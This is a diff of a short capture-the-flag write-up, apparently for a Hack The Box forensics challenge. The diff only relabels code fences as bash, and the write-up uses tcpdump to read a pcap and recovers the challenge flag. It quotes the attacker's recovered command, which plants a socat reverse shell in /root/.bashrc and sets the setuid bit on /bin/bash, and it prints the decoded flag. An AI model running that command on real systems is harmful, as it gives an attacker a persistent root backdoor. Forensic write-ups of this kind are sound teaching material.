@@ -2,7 +2,7 @@
 
 We are given a pcap file to inspect. Running it through tcpdump, we can observe commands being executed, and their output at the end of the trace:
 
-```
+```bash
 $ tcpdump -r capture.pcap -A
 [...]
 01:31:07.830530 IP 192.168.1.180.menandmice-dns > 192.168.1.166.45416: Flags [P.], seq 36:74, ack 1039, win 503, options [nop,nop,TS val 3125348282 ecr 1067058470], length 38
@@ -64,13 +64,13 @@ E..4..@.@..|.........9.h..{.7..?...........
 
 Especially, we can see the command:
 
-```
+```bash
 echo 'socat TCP:192.168.1.180:1337 EXEC:sh' > /root/.bashrc && echo "==gC9FSI5tGMwA3cfRjd0o2Xz0GNjNjYfR3c1p2Xn5WMyBXNfRjd0o2eCRFS" | rev > /dev/null && chmod +s /bin/bash
 ```
 
 Running the last part, we get the flag:
 
-```
+```bash
 $ echo "==gC9FSI5tGMwA3cfRjd0o2Xz0GNjNjYfR3c1p2Xn5WMyBXNfRjd0o2eCRFS" | rev | base64 -d
 HTB{j4v4_5pr1ng_just_b3c4m3_j4v4_sp00ky!!}
 ```
